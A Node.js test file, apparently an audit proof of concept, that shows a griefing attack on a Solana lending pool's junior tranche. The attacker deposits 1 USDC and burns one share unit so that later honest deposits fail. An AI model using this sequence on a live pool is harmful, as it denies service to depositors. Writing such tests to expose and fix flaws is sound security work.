import test from 'node:test';
import assert from 'node:assert/strict';
import { getBurnInstruction } from '/home/bills/code/dev3pack/notch/node_modules/@solana-program/token/dist/src/index.mjs';
import { USDC, depositIx, newLender, readPool, sendL, setup, tokenBalance, mintSupply, redeem } from '/home/bills/code/dev3pack/notch/tests/lib.js';
test('griefer bricks fresh junior for ~1 USDC (keeps it)', async () => {
  const ctx = await setup({ seed: 0n });
  const g = await newLender(ctx, 2n * USDC);
  assert.ok((await sendL(ctx, g, depositIx(ctx, g, 1n * USDC))).ok);
  assert.ok((await sendL(ctx, g, getBurnInstruction({ account: g.shares, mint: ctx.juniorMint, authority: g.signer, amount: 1n }))).ok);
  console.log('supply', mintSupply(ctx.svm, ctx.juniorMint), 'nav', readPool(ctx.svm, ctx.pool).juniorNav);
  const v = await newLender(ctx, 1000n * USDC);
  for (const amt of [1n * USDC, 1000n * USDC]) { const r = await sendL(ctx, v, depositIx(ctx, v, amt)); console.log('honest junior deposit', amt, 'ok', r.ok); }
  const rs = await sendL(ctx, v, depositIx(ctx, v, 10n * USDC, 'senior')); console.log('honest senior deposit ok', rs.ok);
});
